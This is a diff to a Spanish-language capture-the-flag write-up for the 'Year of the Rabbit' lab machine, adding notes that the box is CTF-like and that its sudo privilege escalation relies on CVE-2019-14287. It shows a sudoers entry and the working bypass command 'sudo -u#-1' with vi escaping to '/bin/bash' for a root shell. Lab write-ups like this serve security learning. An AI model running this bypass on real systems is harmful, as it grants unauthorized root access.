@@ -1,5 +1,7 @@
 # Year of the Rabbit
+Es bastante CTF pero a pesar de lo CTF que es, la máquina es interesante
 
+Interesantes: CVE-2019-14287
 ## Initial Scan
 ```
 21/tcp open  ftp     vsftpd 3.0.2
@@ -105,7 +107,7 @@ Con esto podemos logearnos como gwendoline
 User gwendoline may run the following commands on year-of-the-rabbit:
     (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
 ```
-Este privesc es sencillo
+Este privesc es sencillo ya que la version de sudo esta afectada por el CVE-2019-14287
 ```
 sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
 > :!/bin/bash
